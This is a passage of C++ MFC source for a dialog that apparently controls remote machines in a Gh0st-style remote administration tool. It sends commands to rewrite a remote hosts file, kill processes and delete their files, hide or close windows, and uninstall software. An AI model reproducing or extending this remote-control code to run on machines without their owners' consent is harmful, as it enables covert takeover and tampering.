	// TODO: 在此添加专用代码和/或调用基类

	//delete this;
	CDialog::PostNcDestroy();
}


/// <summary>
/// host文本框文本变动激活保存按钮
/// </summary>
void CSystemDlg::OnEnChangeHosts()
{
	GetDlgItem(IDC_SVAEHOST)->EnableWindow(TRUE);
}

/// <summary>
/// 更新host按钮
/// </summary>
void CSystemDlg::OnBnClickedGethost()
{
	// TODO: Add your control notification handler code here
	GetHostsInfo();
	GetDlgItem(IDC_SVAEHOST)->EnableWindow(FALSE);
}

/// <summary>
/// 保存host按钮
/// </summary>
void CSystemDlg::OnBnClickedSvaehost()
{
	// TODO: Add your control notification handler code here
	LPBYTE lpBuffer = NULL;
	int nLength = m_hosts.GetWindowTextLength();
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + nLength + 1);
	lpBuffer[0] = COMMAND_SETHOSTS;
	m_hosts.GetWindowText((char*)(lpBuffer + 1), nLength + 1);
	m_iocpServer->Send(m_pContext, lpBuffer, 1 + nLength);
	LocalFree(lpBuffer);
	GetDlgItem(IDC_SVAEHOST)->EnableWindow(FALSE);
}

/// <summary>
/// 进程列表鼠标右键
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CSystemDlg::OnNMRClickListPeocess(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: 在此添加控件通知处理程序代码
	CMenu	popup;
	popup.LoadMenu(IDR_PSLIST);
	CMenu* pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this); //加上这句没有右键图标
	*pResult = 0;
}

/// <summary>
/// 结束进程
/// </summary>
void CSystemDlg::OnKillProcess()
{
	KillAndDel(COMMAND_KILLPROCESS);  //结束进程
}

/// <summary>
/// 刷新进程或网络连接的数据
/// </summary>
void CSystemDlg::OnGetPs()
{
	if (m_pro.IsWindowVisible())
		GetProcessList();
	else if (m_net.IsWindowVisible())
		GetNetStateList();	
}

/// <summary>
/// 删除文件
/// </summary>
void CSystemDlg::OnDelPs()
{
	KillAndDel(COMMAND_KILLPROCESSDEL);  
}

/// <summary>
/// 终结进程并删除
/// </summary>
/// <param name="buff">终结进程</param>
/// <param name="flag">是否删除</param>
void CSystemDlg::KillAndDel(BYTE buff)
{
	CListCtrl* pListCtrl = NULL;

	if (m_pro.IsWindowVisible())
		pListCtrl = &m_pro;
	else if (m_net.IsWindowVisible())
		pListCtrl = &m_net;
	else return;

	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (pListCtrl->GetSelectedCount() * 4));
	if (lpBuffer)
	{
		lpBuffer[0] = buff;
		DWORD	dwOffset = 1;
		POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl

		while (pos) //so long as we have a valid POSITION, we keep iterating
		{
			int	nItem = pListCtrl->GetNextSelectedItem(pos);
			DWORD dwProcessID = _ttoi(pListCtrl->GetItemText(nItem, 1).GetBuffer());//pListCtrl->GetItemData(nItem);
			memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
			dwOffset += sizeof(DWORD);
		}
		m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
		LocalFree(lpBuffer);
	}	
}

/// <summary>
/// 网络连接点击
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CSystemDlg::OnNMRClickListNet(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: 在此添加控件通知处理程序代码
	CMenu	popup;
	popup.LoadMenu(IDR_PSLIST);
	CMenu* pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this); //加上这句没有右键图标
	*pResult = 0;
}

/// <summary>
/// 窗口列表单机弹菜单
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CSystemDlg::OnNMRClickListWindows(NMHDR* pNMHDR, LRESULT* pResult)
{
	CMenu	popup;
	popup.LoadMenu(IDR_WINDOWS);
	CMenu* pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this); //加上这句没有右键图标
	*pResult = 0;
}

/// <summary>
/// 刷新窗口列表
/// </summary>
void CSystemDlg::OnWindows()
{
	GetWindowsList();
}


void CSystemDlg::OnWindowsHide()
{
	// TODO: 在此添加命令处理程序代码
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_windows;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_TEST;       //窗口处理数据头
		DWORD hwnd = pListCtrl->GetItemData(nItem);  //得到窗口的句柄一同发送
		pListCtrl->SetItemText(nItem, 3, "隐藏");  //注意这时将列表中的显示状态为"隐藏"
		//这样在删除列表条目时就不删除该项了 如果删除该项窗口句柄会丢失 就永远也不能显示了
		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));  //得到窗口的句柄一同发送
		DWORD dHow = SW_HIDE;               //窗口处理参数 0
		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
	}
}


void CSystemDlg::OnWindowsShow()
{
	// TODO: 在此添加命令处理程序代码
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_windows;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_TEST;
		DWORD hwnd = pListCtrl->GetItemData(nItem);

		pListCtrl->SetItemText(nItem, 3, "显示");

		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
		DWORD dHow = SW_RESTORE;
		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
	}
}

/// <summary>
/// 菜单关闭窗口
/// </summary>
void CSystemDlg::OnWindowsClose()
{
	// TODO: 在此添加命令处理程序代码
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_windows;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_CLOSE;      //注意这个就是我们的数据头
		DWORD hwnd = pListCtrl->GetItemData(nItem); //得到窗口的句柄一同发送
		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
	}

}


void CSystemDlg::OnWindowsMax()
{
	// TODO: 在此添加命令处理程序代码
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_windows;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_TEST;     //同上
		DWORD hwnd = pListCtrl->GetItemData(nItem);  //同上
		pListCtrl->SetItemText(nItem, 3, "显示 | 最大化");   //将状态改为显示
		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
		DWORD dHow = SW_MAXIMIZE;     //同上
		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
	}
}


void CSystemDlg::OnWindowsMin()
{
	// TODO: 在此添加命令处理程序代码
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_windows;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_TEST;
		DWORD hwnd = pListCtrl->GetItemData(nItem);
		pListCtrl->SetItemText(nItem, 3, "显示 | 最小化");
		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
		DWORD dHow = SW_MINIMIZE;
		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));
	}
}

//卸载软件
void CSystemDlg::OnUnistall()
{
	if (m_install.GetSelectedCount() < 1)
	{
		return;
	}

	if (MessageBox(_T("确定要卸载该程序?"), _T("提示"), MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;

	POSITION pos = m_install.GetFirstSelectedItemPosition();
	CString str;
	while (pos)
	{
		int	nItem = m_install.GetNextSelectedItem(pos);
		str = m_install.GetItemText(nItem, 4);

		if (str.GetLength() > 0)
		{
			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + str.GetLength());
			lpBuffer[0] = COMMAND_APPUNINSTALL;
			memcpy(lpBuffer + 1, str.GetBuffer(0), str.GetLength());
			m_iocpServer->Send(m_pContext, lpBuffer, str.GetLength() + 1);
		}
	}
}


/// <summary>
/// 安装信息栏谈菜单
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CSystemDlg::OnNMRClickListInstall(NMHDR* pNMHDR, LRESULT* pResult)
{
	CMenu	popup;
	popup.LoadMenu(IDR_INSTALLLIST);
	CMenu* pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this); //加上这句没有右键图标
	*pResult = 0;
}


/// <summary>
/// 刷新安装软件列表
/// </summary>
void CSystemDlg::OnInistall32817()
{
	GetSoftWareList();
	// TODO: 在此添加命令处理程序代码
}


int sort_column;	// 记录点击的列
//排序
int CALLBACK MyCompareProc(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort)
{
	
	int row1 = (int)lParam1;
	int row2 = (int)lParam2;
	CListCtrl* lc = (CListCtrl*)lParamSort;

	CString lp1 = lc->GetItemText(row1, sort_column);
	CString lp2 = lc->GetItemText(row2, sort_column);


	if (g_CSystemDlg->m_pro.IsWindowVisible())
	{
		//判断是否是PID列
		if (sort_column == 1 || sort_column == 3 || sort_column == 6)
		{

			return atoi(lp1) - atoi(lp2);

		}
		else
		{
			return lp1.CompareNoCase(lp2);
		}

	}
	else if (g_CSystemDlg->m_net.IsWindowVisible())
	{
		//判断是否是PID列
		if (sort_column == 1)
		{

			return atoi(lp1) - atoi(lp2);

		}
		else
		{
			return lp1.CompareNoCase(lp2);
		}
	}
	else
	{
		//判断是否是PID列
		if (sort_column == 1  || sort_column == 0)
		{

			return atoi(lp1) - atoi(lp2);

		}
		else
		{
			return lp1.CompareNoCase(lp2);
		}

	}

	return 0;
}
/// <summary>
/// 点击列头
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CSystemDlg::OnLvnColumnclickListPeocess(NMHDR* pNMHDR, LRESULT* pResult)
{

	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	sort_column = pNMLV->iSubItem;//点击的列
	int count = m_pro.GetItemCount();
	for (int i = 0; i < count; i++)
		m_pro.SetItemData(i, i); // 每行的比较关键字，此处为列序号（点击的列号），可以设置为其他 比较函数的第一二个参数

	m_pro.SortItems(MyCompareProc, (DWORD_PTR)&m_pro);//排序 第二个参数是比较函数的第三个参数

	*pResult = 0;
}


void CSystemDlg::OnLvnColumnclickListWindows(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	sort_column = pNMLV->iSubItem;//点击的列
	int count = m_windows.GetItemCount();
	for (int i = 0; i < count; i++)
		m_windows.SetItemData(i, i); // 每行的比较关键字，此处为列序号（点击的列号），可以设置为其他 比较函数的第一二个参数

	m_windows.SortItems(MyCompareProc, (DWORD_PTR)&m_windows);//排序 第二个参数是比较函数的第三个参数

	*pResult = 0;
}


void CSystemDlg::OnLvnColumnclickListNet(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	sort_column = pNMLV->iSubItem;//点击的列
	int count = m_net.GetItemCount();
	for (int i = 0; i < count; i++)
		m_net.SetItemData(i, i); // 每行的比较关键字，此处为列序号（点击的列号），可以设置为其他 比较函数的第一二个参数

	m_net.SortItems(MyCompareProc, (DWORD_PTR)&m_net);//排序 第二个参数是比较函数的第三个参数

	*pResult = 0;
}

//进程查找
void CSystemDlg::OnPsFind()
{
	CBzDlg m_bzdle(this);
	m_bzdle.DoModal();
	
	if (IDOK)
	{
		DWORD Conut = m_pro.GetItemCount();
		//
		for (size_t i = 0; i < Conut; i++)
		{

			if (m_bzdle.m_beizhu.CompareNoCase(m_pro.GetItemText(i, 0)) == 0)
			{
				MessageBoxA(m_pro.GetItemText(i, 1), "结果", 0);
				return ;
			}

		}
	}

	MessageBoxA("进程未找到","结果",0);
}
